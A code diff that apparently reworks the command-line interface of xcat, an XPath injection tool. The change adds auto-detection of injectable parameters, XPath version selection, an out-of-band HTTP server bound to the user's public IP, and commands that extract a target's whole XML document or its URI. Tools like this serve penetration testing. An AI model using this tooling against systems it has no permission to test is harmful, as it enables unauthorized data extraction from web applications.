@@ -2,15 +2,13 @@ import asyncio
 import click
 import colorama
 import logbook
-import sys
-import functools
-
-from lib.features import get_available_features
-from lib import requests
-from lib.executors import xpath1
-from lib.xpath import expression
-from lib.output import xml
+from lib.requests.injectors import get_all_injectors
+from lib.executors import xpath1, xpath2, docfunction
+from lib.features.xpath_2 import XPath2
+from lib.xpath import E, N, document_uri
+from lib.output import XMLOutput, JSONOutput
 from lib.requests import detector
+import ipgetter
 
 colorama.init()
 
@@ -37,7 +35,7 @@ def xcat(ctx, target, arguments, target_parameter, match_string, method, detecti
     out_handler.push_application()
 
     if detection_method == "true":
-        checker = functools.partial(check_true, match_string)# lambda r, b: match_string in b
+        checker = lambda r, b: match_string in b
     else:
         checker = lambda r, b: not match_string in b
 
@@ -45,9 +43,91 @@ def xcat(ctx, target, arguments, target_parameter, match_string, method, detecti
     ctx.obj["target_param"] = target_parameter
 
 
-def check_true(st, r, b):
-    return st in b
+@xcat.group()
+@click.option("--injector", type=click.Choice(["autodetect"] + list(get_all_injectors().keys())),
+              default="autodetect", help="Type of injection to use.")
+@click.option("--xversion", type=click.Choice(["autodetect", "1","2"]),
+              default="autodetect", help="XPath version to use")
+@click.option("--output", type=click.File('wb'), default="-", help="Location to output XML to")
+@click.option("--format", type=click.Choice(["xml", "json"]), default="xml", help="Format for output")
+@click.option("--public-ip", default="autodetect", help="Public IP address to use with OOB connections")
+@click.pass_context
+def run(ctx, injector, xversion, output, format, public_ip):
+    detector = ctx.obj["detector"]
 
+    if injector == "autodetect":
+        injectors = run_then_return(get_injectors(detector, with_features=False))
+        if len(injectors) == 0:
+            click.echo("Could not autodetect a suitable injection, please explicitly specify")
+            ctx.exit(1)
+        elif len(injectors) > 1:
+            click.echo("Multiple ways to inject parameter, please specify.")
+            click.echo("Injectors: " + ", ".join([i.name() for i in injectors]))
+            click.echo("Run test_injection for more info")
+            ctx.exit(1)
+        injector = list(injectors.keys())[0]
+    else:
+        injector = get_all_injectors()[injector]
+
+    click.echo("Injecting using {}".format(injector.name()))
+
+    if public_ip == "autodetect":
+        try:
+            public_ip = ipgetter.IPgetter().get_externalip()
+        except Exception:
+            click.echo("Could not detect public IP, please explicitly specify")
+            ctx.exit()
+        click.echo("External IP: {}".format(public_ip))
+
+    # Hack Hack Hack:
+    # Setup an OOB http server instance on the doc feature class
+    from lib.features.doc import DocFeature
+    from lib.oob.http import OOBHttpServer
+    DocFeature.server = OOBHttpServer(host=public_ip)
+
+    click.echo("Detecting features...")
+    features = run_then_return(detector.detect_features(injector))
+    click.echo("Supported features: {}".format(", ".join(feature.NAME for feature in features)))
+
+    if XPath2 not in features and xversion == "2":
+        click.echo("XPath version specified as 2 but could not detect XPath2 support. Will try anyway")
+
+    executor = xpath1.XPath1Executor
+
+    if xversion == "autodetect" and XPath2 in features:
+        executor = xpath2.XPath2Executor
+    elif xversion == "2":
+        executor = xpath2.XPath2Executor
+
+    if DocFeature in features:
+        executor = docfunction.DocFunctionExecutor
+
+    output_class = XMLOutput if format == "xml" else JSONOutput
+
+    ctx.obj["injector"] = injector
+    ctx.obj["requester"] = detector.get_requester(injector, features=features)
+    ctx.obj["executor"] = executor(ctx.obj["requester"])
+    ctx.obj["output"] = output_class(output)
+
+
+@run.command(help="Attempt to retrieve the whole XML document")
+@click.option("--query", default="/*[1]", help="Query to retrieve. Defaults to root node (/*[1])")
+@click.pass_context
+def retrieve(ctx, query):
+    click.echo("Retrieving {}".format(query))
+    executor = ctx.obj["executor"]
+    run_then_return(display_results(ctx.obj["output"], executor, E(query)))
+
+
+@run.command(help="Get the URI of the document being queried")
+@click.pass_context
+def get_uri(ctx):
+    click.echo("Retrieving URI...")
+    executor = ctx.obj["executor"]
+    uri = run_then_return(
+        executor.get_string(document_uri(N("/")))
+    )
+    click.echo("URI: {}".format(uri))
 
 @xcat.command(help="Test parameter for injectability")
 @click.pass_context
@@ -56,68 +136,54 @@ def test_injection(ctx):
 
     click.echo("Testing parameter {}:".format(ctx.obj["target_param"]))
 
-    injectors = run_then_return(detector.detect_injectors())
+    injectors = run_then_return(get_injectors(detector, with_features=True))
 
     if len(injectors) == 0:
-        click.echo("Found 0 injectors, are you sure the parameter is vulnerable?")
-    else:
-        click.echo("Found {} injectors. Testing features...".format(len(injectors)))
+        click.echo("Could not inject into parameter. Are you sure it is vulnerable?")
 
-        for injector in injectors:
-            features = run_then_return(detector.detect_features(injector(detector)))
+    for injector, features in injectors.items():
+        injector_example = "{}:\t\t{}".format(injector.__class__.__name__, injector.EXAMPLE)\
+            .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
+        click.echo(injector_example)
 
-            injector_example = "{}:\t\t{}".format(injector.__name__, injector.EXAMPLE)\
-                .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
-            click.echo(injector_example)
-
-            for feature in features:
-                click.echo("\t- {}".format(feature.__name__))
-
-
-@xcat.command(help="Test parameters for features")
-@click.pass_context
-def test_features(ctx):
-    detector = ctx.obj["detector"]
-
+        for feature in features:
+            click.echo("\t- {}".format(feature.__name__))
 
 
 @asyncio.coroutine
-def retrieve_node(executor, target_node):
+def get_injectors(detector, with_features=False):
+    injectors = yield from detector.detect_injectors()
+    if not with_features:
+        return {i:[] for i in injectors}
+    # Doesn't work it seems. Shame :(
+    #return{injector: (yield from detector.detect_features(injector))
+    #        for injector in injectors}
+    returner = {}
+    for injector in injectors:
+        returner[injector] = (yield from detector.detect_features(injector))
+    return returner
+
+
+@asyncio.coroutine
+def display_results(output, executor, target_node, first=True):
+    if first:
+        output.output_started()
+
     children = []
+    node = yield from executor.retrieve_node(target_node)
+    output.output_start_node(node)
 
-    data = yield from executor.retrieve_node(target_node)
-    print("Got node: {}".format(data))
-    if data.child_count > 0:
-        for child in target_node.children(data.child_count):
-            children.append((yield from retrieve_node(executor, child)))
+    if node.child_count > 0:
+        for child in target_node.children(node.child_count):
+            children.append((yield from display_results(output, executor, child, first=False)))
 
-    data = data._replace(children=children)
+    output.output_end_node(node)
+    data = node._replace(children=children)
+
+    if first:
+        output.output_finished()
 
     return data
-
-@click.command()
-def run(target):
-    loop = asyncio.get_event_loop()
-    detect = detector.Detector(target, "POST", "title=Bible", target_parameter="title",
-                               checker=lambda r, b: "Book found" in b)
-    future = asyncio.Task(detect.detect_injectors())
-    loop.run_until_complete(future)
-
-    for cls in future.result():
-        example = "{}:\t\t{}".format(cls.__name__, cls.EXAMPLE)\
-            .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
-        click.echo(example)
-
-    #feature_task = asyncio.Task(get_available_features(requester))
-    #loop.run_until_complete(feature_task)
-    print(future.result())
-    return
-
-    task = asyncio.Task(retrieve_node(xpath1.XPath1Executor(requester), expression.Node("/*[1]")))
-    loop.run_until_complete(task)
-    print(xml.output_node(task.result()).getvalue())
-    print("%s requests sent" % requester.requests_sent)
-    loop.close()
 
 
 def run_then_return(generator):
